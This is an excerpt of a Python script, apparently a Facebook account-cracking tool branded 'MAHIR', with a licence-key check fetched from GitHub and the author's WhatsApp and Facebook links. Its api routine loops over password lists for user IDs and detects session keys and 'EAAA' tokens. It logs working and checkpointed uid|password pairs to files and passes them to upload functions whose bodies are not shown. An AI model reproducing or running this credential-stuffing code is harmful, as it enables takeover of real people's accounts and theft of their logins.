...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/toxic.mahir"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/toxic.mahir")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801314629049")
	subprocess.check_output(["am", "start", "https://wa.me/+8801314629049"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Mahironfire/Approval/main/aprooval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;96m╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
 ...
 > \033[0;96mWARNING       : BAD USE IS PROHIBITED      
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MAHIR] : %s/%s -> \033[0;92m [ MAHIR-OK:%s ]- \033[0;93m[MAHIR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [MAHIR-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[MAHIR-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [MAHIR-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
